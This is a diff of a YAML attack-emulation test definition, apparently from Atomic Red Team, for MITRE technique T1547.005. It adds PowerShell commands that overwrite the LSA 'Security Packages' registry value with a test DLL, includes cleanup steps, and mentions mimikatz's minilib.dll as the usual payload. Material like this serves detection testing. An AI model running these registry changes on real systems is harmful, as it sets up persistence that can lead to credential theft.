@@ -1,25 +1,42 @@
 attack_technique: T1547.005
 display_name: 'Boot or Logon Autostart Execution: Security Support Provider'
 atomic_tests:
-- name: Modify SSP configuration in registry
+- name: Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry
   auto_generated_guid: afdfd7e3-8a0b-409f-85f7-886fdf249c9e
+  description: |
+    Add a value to a Windows registry Security Support Provider pointing to a payload .dll which will normally need to be copied in the system32 folder.
+    A common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
+      Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' -Value "$oldvalue";
+      $newvalue = "AtomicTest.dll";
+      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue
+      
+    cleanup_command: |-
+      $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
+      Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value "$oldvalue";
+      Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old';
+    name: powershell
+    elevation_required: true
+
+- name: Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry
+  auto_generated_guid: de3f8e74-3351-4fdb-a442-265dbf231738
   description: Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.
   supported_platforms:
   - windows
-  input_arguments:
-    fake_ssp_dll:
-      description: Value added to registry key. Normally refers to a DLL name in C:\Windows\System32.
-      type: string
-      default: not-a-ssp
   executor:
     command: |
-      # run these in sequence
-      $SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'
-      $SecurityPackagesUpdated = $SecurityPackages
-      $SecurityPackagesUpdated += "#{fake_ssp_dll}"
-      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated
-
-      # revert (before reboot)
-      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages
+      $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
+      Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' -Value "$oldvalue";
+      $newvalue = "AtomicTest.dll";
+      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue
+      
+    cleanup_command: |-
+      $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
+      Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value "$oldvalue";
+      Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old';
     name: powershell
     elevation_required: true
